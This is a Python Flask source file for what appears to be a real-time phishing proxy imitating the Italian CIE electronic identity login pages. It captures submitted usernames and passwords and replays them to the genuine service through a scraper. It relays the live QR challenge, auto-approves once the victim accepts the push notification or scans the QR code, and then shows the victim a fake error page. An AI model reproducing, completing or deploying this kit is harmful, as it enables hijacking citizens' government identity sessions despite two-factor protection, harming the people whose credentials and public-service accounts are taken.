from flask import Flask, jsonify, redirect, render_template, request, url_for, session
import random
from utils.state import State
import utils.scraping as scraping
from concurrent.futures import ThreadPoolExecutor
import time


# TODO:
# - timer should not start over but retain the actual value (everytime we load the page, poll the original one to see the current value)
# - pass qr without revealing it in the url
# - translation
# - make back and reload not work

# State:
# - cie_wrong_credentials is to be fixed for translation and we must add the deu page. They all behave as cie_login

app = Flask(__name__)
app.secret_key = "HPAS"

DEFAULT_TEMPO_MS = 120000  # 2 minutes

qr_expiry_store: dict[str, int] = {}
last_challenge = ""

def get_stored_expiry(challenge: str) -> int|None:
    return qr_expiry_store.get(challenge)

def set_stored_expiry(challenge:str, expiry_ms:int):
    qr_expiry_store[challenge] = expiry_ms

random.seed()

def todo():
    return "<b>TO BE IMPLEMENTED</b>"

state = State()
scraper: scraping.Scraper

# QR code functioning:
# when we press "login with CIE", we get redirected to a login page
# with some parameters, one of them being the challenge. With this
# challenge the website generates the QR code (qr source is @ line
# 490 in login_cie.html). Perhaps the best course of action is to 
# simply do the login and pass that field as argument to login_cie,
# so that it can display the correct QR code

@app.route('/')
def landing_page():
    return render_template('landing_page.html', node = str(random.randrange(1, 7)))

@app.route('/do_login/', methods = ["POST", "GET"])
def do_login():
    """
    When pressing the "entra con CIE" button (@see templates/landing_page.html at line 938), we redirect here, where:
    - we do the exact same with our scraper, retrieving the valid qr code and challenge
    - go to /idp/login/livello2 page with these info as arguments
    """
    elements = scraper.get_cie_page_elements()
    challenge= elements.get("challenge", "NA")
    session["qr_str"] = elements.get("qr_str", "NA")
    opId = elements.get("opId", "NA")

    return redirect(url_for(
        'cie_level2',
        opId = opId,
        challenge = challenge,
        level = 2,
        SPName="https%3A%2F%2Fidpcwrapper.crs.lombardia.it%2Fmetadata%2Fsp-metadata-cie.xml",
        SPLogo="https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2Fimages%2Fcielogo.png",
        value="e1s2"
    ))

@app.route('/idp/login/livello2/', methods=['GET', 'POST'])
def cie_level2():
    global last_challenge
    """
    To emulate the original website, we use the same address for two different things:
    1) the login page with credentials/QR code (if challenge is present in the arguments)
    2) the "waiting for push notification" page on success, or the "wrong credentials"
        page on error (if challenge is absent in the arguments)
    """
    challenge = request.args.get('challenge')
    lang = request.values.get('eccLang', "it")
    server_now_ms = int(time.time() * 1000)
    timer_key = challenge or last_challenge
    stored = get_stored_expiry(timer_key)
    if stored is None:
        # first time for this challenge -> create expiry
        expiry_ms = server_now_ms + DEFAULT_TEMPO_MS
        set_stored_expiry(timer_key, expiry_ms)
    else:
        expiry_ms = int(stored)

    # the original website does not change url throughout the login process, so we emulate that
    # by using the same website and checking the arguments
    if challenge == None:
        username = request.form.get("username", "")
        password = request.form.get("password", "")

        result = scraper.perform_login(username, password)

        page = "{p}_{lang}.html".format(
            p = "cie_waiting_push" if result else "cie_wrong_credentials",
            lang = "deu" if lang == "deu" else "it"
        )

        # execute in background: this will wait for the user to accept 
        # push notification and automatically press the button to accept.
        # Moreover, it will set scraper.push_approved to true, letting us know
        # that the user should be shown an error page (we completed login).
        # This is done via static/cie_waiting_push/l12.js.jsp. It polls
        # /idp/login/livello1e2checkpush, and if the returned status is
        # wait it does nothing, if the return status is anything else it calls
        # /idp/login/livello1e2postpush
        if result:
            executor = ThreadPoolExecutor(max_workers=2)
            _ = executor.submit(scraper.approve, 120)

        return render_template(page,
           expiry_ms=expiry_ms,
           server_now_ms=server_now_ms,
           tempoQR_ms=DEFAULT_TEMPO_MS,
       )


    qr_str = session.get("qr_str", "")
    page = "cie_login_{}.html".format("deu" if lang == "deu" else "it")
    last_challenge = challenge

    # handle qr code login
    executor = ThreadPoolExecutor(max_workers=2)
    _ = executor.submit(scraper.qr_approve, 120)

    return render_template( page, qr_str = qr_str, challenge = challenge, opId = request.args.get('opId'), 
                               expiry_ms=expiry_ms,
                               server_now_ms=server_now_ms,
                               tempoQR_ms=DEFAULT_TEMPO_MS,
                           )

@app.route("/idp/login/livello1e2checkpush")
def check_push():
    if scraper.push_approved:
        return jsonify({"status": "OK"})
    return jsonify({"status": "WAIT"})

@app.route("/idp/login/livello1e2checkqrcode")
def check_qr():
    if scraper.qr_approved:
        return jsonify({"status": "OK"})
    return jsonify({"status": "WAIT"})


# post approval: just show an error page
@app.route("/idp/login/livello1e2postpush")
def cie_push_approved():
    return render_template("cie_error_it.html")

@app.route('/idp/login/livello1e2postqrcode')
def cie_qr_code_approved():
    return render_template("cie_error_it.html")

if __name__ == '__main__':
    scraper = scraping.Scraper()
    app.run(debug=True, host='0.0.0.0', port=5000, use_reloader = False)
